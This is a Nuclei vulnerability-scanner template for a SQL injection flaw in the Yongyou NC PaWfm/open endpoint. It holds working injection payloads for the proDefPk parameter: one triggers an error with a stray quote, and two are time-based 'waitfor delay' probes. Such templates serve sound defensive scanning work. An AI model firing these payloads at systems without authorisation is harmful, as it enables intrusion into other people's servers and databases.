id: yongyou-nc-pawfm-sqli
info:
  name: "Yongyou NC PaWfm SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: Yongyou NC

flow: |
  http(1) && http(2)

http:
  - id: "1"
    method: GET
    path:
      - "{{BaseURL}}/portal/pt/PaWfm/open?pageId=login&proDefPk=11'"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "sql:"
      - type: word
        words:
          - "字符串 '11'' 后的引号不完整"

  - id: "2"
    method: GET
    path:
      - "{{BaseURL}}/portal/pt/PaWfm/open?pageId=login&proDefPk=11';waitfor+delay+'0:0:5'--"
      - "{{BaseURL}}/portal/pt/PaWfm/open?pageId=login&proDefPk=11';waitfor+delay+'0:0:8'--"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<Url>@NOPRODEF@</Url>"
          - "?xml version="
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
